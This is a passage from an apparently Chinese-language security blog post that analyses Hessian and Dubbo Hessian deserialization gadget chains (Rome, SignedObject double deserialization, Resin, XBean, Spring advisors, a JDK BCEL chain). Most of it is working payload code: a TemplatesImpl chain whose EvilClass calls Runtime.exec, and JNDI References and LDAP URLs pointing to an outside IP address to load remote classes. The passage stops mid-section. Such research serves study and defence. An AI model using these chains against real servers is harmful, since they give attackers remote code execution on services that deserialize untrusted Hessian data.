<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">	&lt;groupId&gt;com.caucho&lt;/groupId&gt;</span><br><span class="line">	&lt;artifactId&gt;hessian&lt;/artifactId&gt;</span><br><span class="line">	&lt;version&gt;4.0.66&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p>如果使用Dubbo sample中的Hessian进行反序列化，会发现报错，抛出的异常信息为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.alibaba.com.caucho.hessian.io.HessianProtocolException: &#x27;com.sun.syndication.feed.impl.ObjectBean&#x27; could not be instantiated</span><br></pre></td></tr></table></figure>

<p>这是因为Dubbo封装的Hessian中，使用了<code>JavaDeserializer</code>来反序列化对象。它会根据类的构造方法去实例化一个对象。可以看看ObjectBean的构造方法：</p>
<p><img src="./image-20220929173113080-5299514.png" alt="image-20220929173113080"></p>
<p>它会走到<code>new EqualsBean(beanClass,obj)</code>这里：</p>
<p><img src="./image-20220929173208361-5299514.png" alt="image-20220929173208361"></p>
<p>在Hessian进行反序列化的时候，首先会实例化对象，此时传入的参数都是null。所以在Dubbo Hessian反序列化这个<code>ObjectBean</code>对象时，在初始化的时候会抛出异常，终止了后续的运行。原生的Hessian能够执行，是因为其使用的是<code>unsafe.allocateInstance</code>来实例化对象，这个方法仅通过<code>Class</code>就可以实例化对象，而不需要调用构造方法。</p>
<p>因此在<code>Dubbo Hessian</code>环境下，需要稍微改一下这条链子的入口，<code>EqualsBean</code>自己也存在<code>hashCode</code>方法，并且也会调用自己的<code>beanHashCode</code>，这样也就和前面一样了。最后构造的代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">EvilGetter evilGetter = new EvilGetter();</span><br><span class="line">ToStringBean toStringBean = new ToStringBean(EvilGetter.class,evilGetter);</span><br><span class="line">EqualsBean equalsBean = new EqualsBean(String.class,&quot;123&quot;);</span><br><span class="line">HashMap hashMap = new HashMap();</span><br><span class="line">hashMap.put(equalsBean,&#x27;a&#x27;);</span><br><span class="line"></span><br><span class="line">Class clazz = EqualsBean.class;</span><br><span class="line">Field field = clazz.getDeclaredField(&quot;_obj&quot;);</span><br><span class="line">field.setAccessible(true);</span><br><span class="line">field.set(equalsBean,toStringBean);</span><br><span class="line"></span><br><span class="line">HessianOutput hessianOutput = new HessianOutput(new FileOutputStream(&quot;/tmp/hessian.class&quot;));</span><br><span class="line">hessianOutput.findSerializerFactory().setAllowNonSerializable(true);</span><br><span class="line">hessianOutput.writeObject(hashMap);</span><br><span class="line"></span><br><span class="line">HessianInput hessianInput = new HessianInput(new FileInputStream(&quot;/tmp/hessian.class&quot;));</span><br><span class="line">hessianInput.readObject();</span><br></pre></td></tr></table></figure>

<p>后续的利用只需要修改<code>EvilGetter</code>对象就可以了。寻找一些<code>getter</code>就能触发的Gadgets，例如<code>JdbcRowSetImpl</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String jndiUrl = &quot;ldap://localhost:1389/obj&quot;;</span><br><span class="line">JdbcRowSetImpl rs = new JdbcRowSetImpl();</span><br><span class="line">rs.setDataSourceName(jndiUrl);</span><br><span class="line">rs.setMatchColumn(&quot;foo&quot;);</span><br></pre></td></tr></table></figure>

<p>除此之外，<code>UnixPrintService</code>类中的一些getter方法可以直接命令执行。</p>
<h3 id="（2）Rome-二次反序列化-Gadgets"><a href="#（2）Rome-二次反序列化-Gadgets" class="headerlink" title="（2）Rome 二次反序列化 Gadgets"></a>（2）Rome 二次反序列化 Gadgets</h3><p><code>TemplatesImpl</code>算是反序列化中的一条经典的链子。调用其<code>getOutputProperties</code>方法，最后可以加载任意字节码，达到RCE的目的。</p>
<p>了解了ROME链子后，会发现通过ROME可以调用<code>TemplatesImpl</code>的<code>getOutputProperties</code>。正常的构造如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">// TemplatesImpl</span><br><span class="line">byte[] code = ClassPool.getDefault().get(&quot;org.apache.dubbo.samples.basic.impl.EvilClass&quot;).toBytecode();</span><br><span class="line">TemplatesImpl obj = new TemplatesImpl();</span><br><span class="line">setFieldValue(obj, &quot;_name&quot;, &quot;1&quot;);;</span><br><span class="line">setFieldValue(obj,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span><br><span class="line">setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;code&#125;);</span><br><span class="line"></span><br><span class="line">// Rome Gadgets</span><br><span class="line">ToStringBean toStringBean = new ToStringBean(Templates.class,obj);</span><br><span class="line">EqualsBean equalsBean = new EqualsBean(String.class,&quot;123&quot;);</span><br><span class="line">HashMap hashMap = new HashMap();</span><br><span class="line">hashMap.put(equalsBean,&#x27;a&#x27;);</span><br><span class="line"></span><br><span class="line">Class clazz = EqualsBean.class;</span><br><span class="line">Field field = clazz.getDeclaredField(&quot;_obj&quot;);</span><br><span class="line">field.setAccessible(true);</span><br><span class="line">field.set(equalsBean,toStringBean);</span><br><span class="line"></span><br><span class="line">HessianOutput hessianOutput = new HessianOutput(new FileOutputStream(&quot;/tmp/hessian.class&quot;));</span><br><span class="line">hessianOutput.findSerializerFactory().setAllowNonSerializable(true);</span><br><span class="line">hessianOutput.writeObject(hashMap);</span><br><span class="line"></span><br><span class="line">HessianInput hessianInput = new HessianInput(new FileInputStream(&quot;/tmp/hessian.class&quot;));</span><br><span class="line">hessianInput.readObject();</span><br></pre></td></tr></table></figure>

<p>构造的恶意类<code>EvilClass</code>如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">package org.apache.dubbo.samples.basic.impl;</span><br><span class="line"></span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class EvilClass extends AbstractTranslet &#123;</span><br><span class="line">    public EvilClass()&#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime.getRuntime().exec(&quot;open /System/Applications/Calculator.app&quot;);</span><br><span class="line">        &#125; catch (IOException ignored) &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行之后，会发现并没有执行命令。可以打断点到TemplatesImpl的getOutputProperties，会发现_tfactory字段值为null，终止了后面链的调用。为了排查这个问题，可以去看看TemplatesImpl的_tfactory这个字段。会发现它是一个transient，也就是说在序列化和反序列化的过程中，它是不参与的。</p>
<p><img src="./image-20220929182008029-5299514.png" alt="image-20220929182008029"></p>
<p>在原生的Java反序列化调用过程中，因为TemplatesImpl重写了readObject方法，导致在反序列化的过程中，会执行到如下代码：</p>
<p><img src="./image-20220929182108619-5299514.png" alt="image-20220929182108619"></p>
<p>这里给_tfactory赋值了。而在Hessian反序列化过程中，并没有这一环，导致了这一条链的终止。</p>
<p>为了解决这个问题，想到的一个办法就是寻找原生的Java反序列化，也就是常说到的二次序列化。可以关注到SignedObject这个类，其getObject正好满足了这个条件：</p>
<p><img src="./image-20220929182236243-5299514.png" alt="image-20220929182236243"></p>
<p><code>this.content</code>是内部属性，可控。通过<code>ROME</code>链，调用到<code>SignedObject</code>的<code>getObject</code>，然后给<code>this.content</code>正常的反序列化数据即可。最后构造的<code>Payload</code>如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">// TemplatesImpl</span><br><span class="line">byte[] code = ClassPool.getDefault().get(&quot;org.example.EvilClass&quot;).toBytecode();</span><br><span class="line">TemplatesImpl obj = new TemplatesImpl();</span><br><span class="line">setFieldValue(obj, &quot;_name&quot;, &quot;1&quot;);;</span><br><span class="line">setFieldValue(obj,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span><br><span class="line">setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;code&#125;);</span><br><span class="line">ToStringBean toStringBean = new ToStringBean(Templates.class,obj);</span><br><span class="line"></span><br><span class="line">EqualsBean equalsBean = new EqualsBean(String.class,&quot;123&quot;);</span><br><span class="line">HashMap hashMap = new HashMap();</span><br><span class="line">hashMap.put(equalsBean,&#x27;a&#x27;);</span><br><span class="line">setFieldValue(equalsBean,&quot;_obj&quot;,toStringBean);</span><br><span class="line"></span><br><span class="line">// 二次序列化构造</span><br><span class="line">KeyPairGenerator kpg = KeyPairGenerator.getInstance(&quot;DSA&quot;);</span><br><span class="line">kpg.initialize(1024);</span><br><span class="line">KeyPair kp = kpg.generateKeyPair();</span><br><span class="line">SignedObject signedObject = new SignedObject(hashMap, kp.getPrivate(), Signature.getInstance(&quot;DSA&quot;));</span><br><span class="line">ToStringBean toStringBean1 = new ToStringBean(SignedObject.class,signedObject);</span><br><span class="line"></span><br><span class="line">EqualsBean equalsBean1 = new EqualsBean(String.class,&quot;123&quot;);</span><br><span class="line"></span><br><span class="line">HashMap hashMap1 = new HashMap();</span><br><span class="line">hashMap1.put(equalsBean1,&#x27;a&#x27;);</span><br><span class="line">setFieldValue(equalsBean1,&quot;_obj&quot;,toStringBean1);</span><br><span class="line"></span><br><span class="line">HessianOutput hessianOutput = new HessianOutput(new FileOutputStream(&quot;/tmp/hessian.class&quot;));</span><br><span class="line">hessianOutput.writeObject(hashMap1);</span><br><span class="line"></span><br><span class="line">HessianInput hessianInput = new HessianInput(new FileInputStream(&quot;/tmp/hessian.class&quot;));</span><br><span class="line">hessianInput.readObject();</span><br></pre></td></tr></table></figure>

<p>在<code>Dubbo Hessian</code>中会报错，而原生的<code>Hessian</code>可以运行。主要是由于<code>SignedObject</code>构造方法中如果存在空的参数就会抛错。</p>
<h3 id="（3）Resin-Gadgets"><a href="#（3）Resin-Gadgets" class="headerlink" title="（3）Resin Gadgets"></a>（3）Resin Gadgets</h3><p>该链的入口就是调用<code>XString</code>的<code>equals</code>方法。整个调用栈如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">com.sun.org.apache.xpath.internal.objects.XString#equals</span><br><span class="line">com.caucho.naming.QName#toString</span><br><span class="line">ContinuationContext#composeName</span><br><span class="line">ContinuationContext#getTargetContext</span><br><span class="line">NamingManager#getContext</span><br><span class="line">NamingManager#getObjectInstance</span><br><span class="line">NamingManager#getObjectFactoryFromReference</span><br><span class="line">VersionHelper12#loadClass</span><br></pre></td></tr></table></figure>

<p>整条链子比较短，代码也比较清晰。最后是利用URLClassLoader来远程加载类。不过在跟代码的时候，最后调用到loadClass存在一个条件：<code>com.sun.jndi.ldap.object.trustURLCodebase</code>需要设置为<code>true</code>，高版本JDK下该值默认为<code>false</code>。</p>
<p><img src="./image-20220930165353144-5299514.png" alt="image-20220930165353144"></p>
<p>这里主要记一下如何调用到<code>XString#equals</code>方法。前面分析过，<code>Hessian</code>在进行反序列化的时候，如果反序列化的对象是<code>Hashmap</code>，会调用其<code>put</code>方法。跟一下<code>Hashmap</code>的<code>put</code>方法，会执行<code>putVal</code>，在这个里面会校验<code>key</code>值，然后调用<code>equals</code>方法来进行比较。只不过这里想要调用到<code>equals</code>方法需要一些条件：</p>
<p><img src="./image-20220930170201294-5299514.png" alt="image-20220930170201294"></p>
<p>这里的逻辑很简单，当调用<code>put</code>方法向对象中插入的<code>key</code>的时候，先会计算插入对象的<code>hashCode</code>值，然后通过该值，计算原有的<code>table</code>中是否已经存储。这里想要调用到<code>equals</code>方法，需要满足的条件就是两个不同对象的<code>hashCode</code>值相同。</p>
<p>XString hashCode的计算方式：（其实这里就也是String类型的hashCode计算方式）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s[0]*31^(n-1) + s[1]*31^(n-2) + ... + s[n-1]</span><br></pre></td></tr></table></figure>

<p>QName hashCode计算的方式：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int hashCode = 337;</span><br><span class="line">for(int i = this.size() - 1; i &gt;= 0; --i) &#123;</span><br><span class="line">	hashCode = &#x27;\ufff1&#x27; * hashCode + this.get(i).hashCode();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在<code>marshalsec</code>源码中，提供了这个碰撞的函数：只需要向<code>unhash    </code>传入hashcode值，就会生成一个字符串，其hashcode值相同。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">public static String unhash ( int hash ) &#123;</span><br><span class="line">    int target = hash;</span><br><span class="line">    StringBuilder answer = new StringBuilder();</span><br><span class="line">    if ( target &lt; 0 ) &#123;</span><br><span class="line">        // String with hash of Integer.MIN_VALUE, 0x80000000</span><br><span class="line">        answer.append(&quot;\\u0915\\u0009\\u001e\\u000c\\u0002&quot;);</span><br><span class="line"></span><br><span class="line">        if ( target == Integer.MIN_VALUE )</span><br><span class="line">            return answer.toString();</span><br><span class="line">        // Find target without sign bit set</span><br><span class="line">        target = target &amp; Integer.MAX_VALUE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    unhash0(answer, target);</span><br><span class="line">    return answer.toString();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">private static void unhash0 ( StringBuilder partial, int target ) &#123;</span><br><span class="line">    int div = target / 31;</span><br><span class="line">    int rem = target % 31;</span><br><span class="line"></span><br><span class="line">    if ( div &lt;= Character.MAX_VALUE ) &#123;</span><br><span class="line">        if ( div != 0 )</span><br><span class="line">            partial.append((char) div);</span><br><span class="line">        partial.append((char) rem);</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        unhash0(partial, div);</span><br><span class="line">        partial.append((char) rem);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后构造的<code>demo</code>测试案例如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">System.setProperty(&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;,&quot;false&quot;);</span><br><span class="line"></span><br><span class="line">Class clazz = Class.forName(&quot;javax.naming.spi.ContinuationContext&quot;);</span><br><span class="line">Constructor constructor = clazz.getDeclaredConstructor(CannotProceedException.class, Hashtable.class);</span><br><span class="line">constructor.setAccessible(true);</span><br><span class="line">CannotProceedException cannotProceedException = new CannotProceedException();</span><br><span class="line">cannotProceedException.setResolvedObj(new Reference(&quot;123&quot;,&quot;m1sn0w&quot;,&quot;http://101.34.38.37/&quot;));</span><br><span class="line">Hashtable hashtable = new Hashtable();</span><br><span class="line">Context context = (Context) constructor.newInstance(cannotProceedException,hashtable);</span><br><span class="line"></span><br><span class="line">QName qName = new QName(context);</span><br><span class="line">ArrayList arrayList = new ArrayList();</span><br><span class="line">arrayList.add(&quot;foo&quot;);</span><br><span class="line">arrayList.add(&quot;bar&quot;);</span><br><span class="line">setFieldValue(qName,&quot;_items&quot;,arrayList);</span><br><span class="line">XString xString = new XString(unhash(qName.hashCode()));</span><br><span class="line"></span><br><span class="line">HashMap&lt;Object, Object&gt; s = new HashMap&lt;&gt;();</span><br><span class="line">s.put(qName,&quot;123&quot;);</span><br><span class="line">s.put(xString,&quot;!23&quot;);</span><br><span class="line"></span><br><span class="line">HessianOutput hessianOutput = new HessianOutput(new FileOutputStream(&quot;/tmp/hessian.class&quot;));</span><br><span class="line">hessianOutput.findSerializerFactory().setAllowNonSerializable(true);</span><br><span class="line">hessianOutput.writeObject(s);</span><br><span class="line"></span><br><span class="line">HessianInput hessianInput = new HessianInput(new FileInputStream(&quot;/tmp/hessian.class&quot;));</span><br><span class="line">hessianInput.readObject();</span><br></pre></td></tr></table></figure>

<p>在远端服务器上放置一个<code>class</code>，其静态方法执行命令即可。</p>
<h3 id="（4）XBean-Gadgets"><a href="#（4）XBean-Gadgets" class="headerlink" title="（4）XBean Gadgets"></a>（4）XBean Gadgets</h3><p>依赖包：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.xbean&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;xbean-naming&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;4.5&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p>和<code>Resin</code>类似，调用<code>ContextUtil$ReadOnlyBinding</code>，然后一系列处理后远程加载<code>class</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">loadClass:92, VersionHelper12 (com.sun.naming.internal)</span><br><span class="line">loadClass:101, VersionHelper12 (com.sun.naming.internal)</span><br><span class="line">loadClass:115, VersionHelper12 (com.sun.naming.internal)</span><br><span class="line">getObjectFactoryFromReference:163, NamingManager (javax.naming.spi)</span><br><span class="line">getObjectInstance:329, NamingManager (javax.naming.spi)</span><br><span class="line">resolve:73, ContextUtil (org.apache.xbean.naming.context)</span><br><span class="line">getObject:204, ContextUtil$ReadOnlyBinding (org.apache.xbean.naming.context)</span><br><span class="line">toString:192, Binding (javax.naming)</span><br><span class="line">equals:391, XString (com.sun.org.apache.xpath.internal.objects)</span><br><span class="line">putVal:636, HashMap (java.util)</span><br><span class="line">put:613, HashMap (java.util)</span><br><span class="line">main:27, XBeanGadgets (org.example)</span><br></pre></td></tr></table></figure>

<p>这里最后的调用链和<code>Resin</code>类似，所以也需要开启<code>com.sun.jndi.ldap.object.trustURLCodebase</code>为<code>true</code></p>
<h3 id="（5）Spring-Partially-Comparable-Advisor-Holder-Gadgets"><a href="#（5）Spring-Partially-Comparable-Advisor-Holder-Gadgets" class="headerlink" title="（5）Spring Partially Comparable Advisor Holder Gadgets"></a>（5）Spring Partially Comparable Advisor Holder Gadgets</h3><p>最后调用的是<code>SimpleJndiBeanFactory</code>的<code>getBeanl</code>来进行<code>JNDI</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String jndiUrl = &quot;ldap://101.34.38.37:80&quot;;</span><br><span class="line">SimpleJndiBeanFactory simpleJndiBeanFactory = new SimpleJndiBeanFactory();</span><br><span class="line">simpleJndiBeanFactory.getBean(jndiUrl);</span><br></pre></td></tr></table></figure>

<p>该条链的调用栈如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">execute:90, JndiTemplate (org.springframework.jndi)</span><br><span class="line">lookup:152, JndiTemplate (org.springframework.jndi)</span><br><span class="line">lookup:179, JndiTemplate (org.springframework.jndi)</span><br><span class="line">lookup:95, JndiLocatorSupport (org.springframework.jndi)</span><br><span class="line">doGetSingleton:218, SimpleJndiBeanFactory (org.springframework.jndi.support)</span><br><span class="line">doGetType:226, SimpleJndiBeanFactory (org.springframework.jndi.support)</span><br><span class="line">getType:191, SimpleJndiBeanFactory (org.springframework.jndi.support)</span><br><span class="line">getOrder:127, BeanFactoryAspectInstanceFactory (org.springframework.aop.aspectj.annotation)</span><br><span class="line">getOrder:216, AbstractAspectJAdvice (org.springframework.aop.aspectj)</span><br><span class="line">getOrder:80, AspectJPointcutAdvisor (org.springframework.aop.aspectj)</span><br><span class="line">toString:151, AspectJAwareAdvisorAutoProxyCreator$PartiallyComparableAdvisorHolder (org.springframework.aop.aspectj.autoproxy)</span><br><span class="line">equals:391, XString (com.sun.org.apache.xpath.internal.objects)</span><br><span class="line">equals:104, HotSwappableTargetSource (org.springframework.aop.target)</span><br><span class="line">putVal:636, HashMap (java.util)</span><br><span class="line">put:613, HashMap (java.util)</span><br><span class="line">readMap:114, MapDeserializer (com.caucho.hessian.io)</span><br><span class="line">readMap:538, SerializerFactory (com.caucho.hessian.io)</span><br><span class="line">readObject:1160, HessianInput (com.caucho.hessian.io)</span><br></pre></td></tr></table></figure>

<p>还是通过<code>XString</code>的<code>equals</code>方法调用任意对象的<code>toString</code>方法。</p>
<h3 id="（6）Spring-Abstract-Bean-Factory-Pointcut-Advisor-Gadgets"><a href="#（6）Spring-Abstract-Bean-Factory-Pointcut-Advisor-Gadgets" class="headerlink" title="（6）Spring Abstract Bean Factory Pointcut Advisor Gadgets"></a>（6）Spring Abstract Bean Factory Pointcut Advisor Gadgets</h3><p>和上面那条链子相似：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">doInContext:155, JndiTemplate$1 (org.springframework.jndi)</span><br><span class="line">execute:87, JndiTemplate (org.springframework.jndi)</span><br><span class="line">lookup:152, JndiTemplate (org.springframework.jndi)</span><br><span class="line">lookup:179, JndiTemplate (org.springframework.jndi)</span><br><span class="line">lookup:95, JndiLocatorSupport (org.springframework.jndi)</span><br><span class="line">doGetSingleton:218, SimpleJndiBeanFactory (org.springframework.jndi.support)</span><br><span class="line">getBean:112, SimpleJndiBeanFactory (org.springframework.jndi.support)</span><br><span class="line">getAdvice:109, AbstractBeanFactoryPointcutAdvisor (org.springframework.aop.support)</span><br><span class="line">equals:74, AbstractPointcutAdvisor (org.springframework.aop.support)</span><br></pre></td></tr></table></figure>

<p>利用<code>HashMap</code>调用equals来触发。测试<code>demo</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">String jndiUrl = &quot;ldap://101.34.38.37:80&quot;;</span><br><span class="line">SimpleJndiBeanFactory simpleJndiBeanFactory = new SimpleJndiBeanFactory();</span><br><span class="line">DefaultBeanFactoryPointcutAdvisor pcadv = new DefaultBeanFactoryPointcutAdvisor();</span><br><span class="line">pcadv.setBeanFactory(simpleJndiBeanFactory);</span><br><span class="line">pcadv.setAdviceBeanName(jndiUrl);</span><br><span class="line">pcadv.equals(new DefaultBeanFactoryPointcutAdvisor());</span><br></pre></td></tr></table></figure>

<h3 id="（7）JDK原生Gadgets"><a href="#（7）JDK原生Gadgets" class="headerlink" title="（7）JDK原生Gadgets"></a>（7）JDK原生Gadgets</h3><p>JDK原生Gadgets的入口点是toString，所以实际利用的时候，需要配合Dubbo Hessian中的一些漏洞，例如：CVE-2021-43297。</p>
<p>该条Gadgets分为三部分：</p>
<ul>
<li><code> sun.security.pkcs.PKCS9Attributes</code>调用<code>toString</code>作为入口点</li>
<li><code>SwingLazyValue.createValue</code>调用任意对象的方法</li>
<li>利用<code>com.sun.org.apache.bcel.internal.util.JavaWrapper</code>调用<code>bcel</code>加载器</li>
</ul>
<p>PS：这里使用了bcel加载器，也就是<code>com.sun.org.apache.bcel.internal.util.ClassLoader</code>。高版本的<code>jdk</code>移除了这个类，所以利用不了。</p>
<h4 id="BCEL加载器RCE-Gadgets"><a href="#BCEL加载器RCE-Gadgets" class="headerlink" title="BCEL加载器RCE Gadgets"></a>BCEL加载器RCE Gadgets</h4><p>第一部分和第二部分的连接使用<code>Hashtable</code>的<code>set</code>方法。整个调用链不长，调用栈如下所示：</p>
